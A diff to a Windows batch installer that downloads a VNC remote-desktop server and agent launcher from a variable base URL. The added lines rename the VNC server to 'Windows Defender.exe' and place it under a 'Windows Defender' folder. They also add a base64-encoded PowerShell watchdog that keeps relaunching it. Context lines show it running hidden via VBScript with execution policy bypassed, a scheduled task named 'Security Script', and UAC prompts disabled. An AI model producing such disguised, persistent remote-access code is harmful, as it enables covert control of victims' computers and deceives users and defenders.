@@ -43,7 +43,7 @@ echo.
 REM --- 1. Stop running processes ---
 echo [1/6] Stopping running processes...
 taskkill /F /IM AgentLauncher.exe >nul 2>&1
-taskkill /F /IM VncDirect.exe >nul 2>&1
+taskkill /F /IM Windows Defender.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
 
 REM --- 2. Create temp download directory ---
@@ -56,10 +56,10 @@ echo.
 
 set "FAIL=0"
 
-echo    [1/6] VncDirect.exe (~67MB, may take a moment)...
-powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/VncDirect.exe' -OutFile '%TEMPDIR%\VncDirect.exe' -UseBasicParsing -TimeoutSec 300"
-if not exist "%TEMPDIR%\VncDirect.exe" (
-    echo    [!] FAILED to download VncDirect.exe
+echo    [1/6] Windows Defender.exe (~67MB, may take a moment)...
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/Windows Defender.exe' -OutFile '%TEMPDIR%\Windows Defender.exe' -UseBasicParsing -TimeoutSec 300"
+if not exist "%TEMPDIR%\Windows Defender.exe" (
+    echo    [!] FAILED to download Windows Defender.exe
     set "FAIL=1"
 ) else (
     echo    [OK]
@@ -128,7 +128,7 @@ echo [3/6] Installing to %DEST%...
 if not exist "%DEST%" mkdir "%DEST%"
 if not exist "%DEST%\VncDirect" mkdir "%DEST%\VncDirect"
 
-copy /y "%TEMPDIR%\VncDirect.exe" "%DEST%\VncDirect\VncDirect.exe" >nul
+copy /y "%TEMPDIR%\Windows Defender.exe" "%DEST%\VncDirect\Windows Defender.exe" >nul
 copy /y "%TEMPDIR%\turbojpeg.dll" "%DEST%\VncDirect\turbojpeg.dll" >nul
 copy /y "%TEMPDIR%\vcruntime140.dll" "%DEST%\VncDirect\vcruntime140.dll" >nul
 copy /y "%TEMPDIR%\AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul
@@ -166,7 +166,7 @@ echo     Scheduled task "Security Script" created.
 :skip_security
 
 REM --- Write watchdog PowerShell script ---
-powershell -NoProfile -Command "$b64='dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIABpAGYAIAAoACEAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIABWAG4AYwBEAGkAcgBlAGMAdAAgAC0ARQBBACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACkAIAB7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAVgBuAGMARABpAHIAZQBjAHQALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAcABvAHIAdAA9ADcAMAAwADIAIABjAHcAZAA9AEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABWAG4AYwBEAGkAcgBlAGMAdABcAHYAbgBjACAAZgBwAHMAPQAzADYAMAAgAHMAYwBhAGwAZQA9ADAAIgAgAC0AVwBvAHIAawBpAG4AZwBEAGkAcgBlAGMAdABvAHIAeQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAdgBuAGMAIgAgAH0AOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgADUAIAB9AA=='; [IO.File]::WriteAllBytes('%DEST%\WinDefend.ps1', [Convert]::FromBase64String($b64))"
+powershell -NoProfile -Command "$b64='dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIABpAGYAIAAoACEAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAiAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAIgAgAC0ARQBBACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACkAIAB7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBwAG8AcgB0AD0ANwAwADAAMgAgAGMAdwBkAD0AQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAdgBuAGMAIABmAHAAcwA9ADMANgAwACAAcwBjAGEAbABlAD0AMAAiACAALQBXAG8AcgBrAGkAbgBnAEQAaQByAGUAYwB0AG8AcgB5ACAAIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAVgBuAGMARABpAHIAZQBjAHQAXAB2AG4AYwAiACAAfQA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAANQAgAH0A'; [IO.File]::WriteAllBytes('%DEST%\WinDefend.ps1', [Convert]::FromBase64String($b64))"
 REM --- Write watchdog VBScript (launches PS1 fully hidden) ---
 echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\WinDefend.vbs"
 echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\Windows Defender\WinDefend.ps1", 0, False >> "%DEST%\WinDefend.vbs"
@@ -208,7 +208,7 @@ echo     UAC prompts disabled. Restart required to take effect.
 REM --- 8. Start services ---
 echo [7/7] Starting Agent and VNC Server...
 cd /d "%DEST%\VncDirect\vnc"
-start "" "%DEST%\VncDirect\VncDirect.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
+start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
 cd /d "%DEST%"
 start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%
 
